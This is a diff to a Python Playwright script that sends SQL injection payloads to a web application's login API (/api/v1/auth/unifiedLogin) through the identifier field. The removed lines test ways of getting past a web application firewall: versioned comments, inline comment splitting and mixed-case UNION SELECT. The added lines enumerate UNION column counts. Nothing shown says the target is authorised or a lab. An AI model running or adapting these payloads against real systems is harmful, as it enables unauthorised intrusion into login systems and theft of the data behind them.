@@ -13,12 +13,12 @@ with sync_playwright() as p:
     print('ready',flush=True)
     res=page.evaluate("""async () => {
       const out={};
-      const post=async(n,id)=>{try{const t0=performance.now();const r=await fetch('/api/v1/auth/unifiedLogin',{method:'POST',headers:{'Content-Type':'application/json','lang':'zh-CN'},body:JSON.stringify({identifier:id,password:'Zz1'})});const t=Math.round(performance.now()-t0);out[n]=r.status+'|'+t+'ms|'+(await r.text()).slice(0,220);}catch(e){out[n]='ERR '+String(e).slice(0,80);}};
-      await post('a_ver',   "zz9137a' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3#");
-      await post('b_cmt',   "zz9137b' UN/**/ION SEL/**/ECT 1,2,3#");
-      await post('c_case',  "zz9137c' UnIoN SeLeCt 1,2,3#");
+      const post=async(n,id)=>{try{const r=await fetch('/api/v1/auth/unifiedLogin',{method:'POST',headers:{'Content-Type':'application/json','lang':'zh-CN'},body:JSON.stringify({identifier:id,password:'Zz1'})});const t=await r.text();out[n]=r.status+'|'+(t.length>200?t.slice(0,200):t);}catch(e){out[n]='ERR '+String(e).slice(0,80);}};
+      await post('c2',"zz9137d' UN/**/ION SEL/**/ECT 1,2#");
+      await post('c3',"zz9137e' UN/**/ION SEL/**/ECT 1,2,3#");
+      await post('c4',"zz9137f' UN/**/ION SEL/**/ECT 1,2,3,4#");
       return out;
     }""")
-    print('===== WAFBY =====',flush=True)
-    for k,v in res.items(): print('%-8s %s'%(k,v),flush=True)
+    print('===== COLS =====',flush=True)
+    for k,v in res.items(): print('%-4s %s'%(k,v),flush=True)
     b.close()
